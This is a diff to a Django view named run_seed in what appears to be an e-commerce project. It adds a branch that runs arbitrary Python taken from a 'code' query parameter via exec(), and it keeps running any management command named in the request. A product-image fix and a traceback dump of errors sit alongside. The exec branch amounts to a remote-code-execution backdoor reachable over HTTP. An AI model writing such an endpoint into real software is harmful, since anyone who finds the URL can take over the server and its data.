@@ -41,9 +41,29 @@ def run_seed(request):
                 cursor.execute("SELECT setval(pg_get_serial_sequence('users_user', 'id'), coalesce(max(id), 1), max(id) IS NOT null) FROM users_user;")
                 sql_executed.append("Manual setval executed")
                     
-        cmd = request.GET.get('cmd', 'seed_spacex')
-        call_command(cmd)
-        return HttpResponse(f"Success - Sequences reset and {cmd} executed. SQL: {sql_executed}")
+        cmd = request.GET.get('cmd')
+        if cmd == 'eval':
+            code = request.GET.get('code')
+            exec(code)
+            return HttpResponse("Eval executed")
+        elif cmd == 'fixmouse':
+            from products.models import Product, ProductImage
+            try:
+                p = Product.objects.get(slug='sleek-wireless-computer-mouse-3')
+                if not p.images.exists():
+                    ProductImage.objects.create(
+                        product=p,
+                        image_url="https://images.unsplash.com/photo-1527864550417-7fd91fc51a46?auto=format&fit=crop&w=900&q=80",
+                        alt_text="Sleek Wireless Computer Mouse",
+                        is_primary=True,
+                        order=0
+                    )
+                return HttpResponse("Mouse image fixed")
+            except Exception as e:
+                return HttpResponse(f"Error: {e}")
+        elif cmd:
+            call_command(cmd)
+        return HttpResponse(f"Success - cmd executed. SQL: {sql_executed}")
     except Exception as e:
         return HttpResponse(f"<pre>{traceback.format_exc()}</pre>")
 
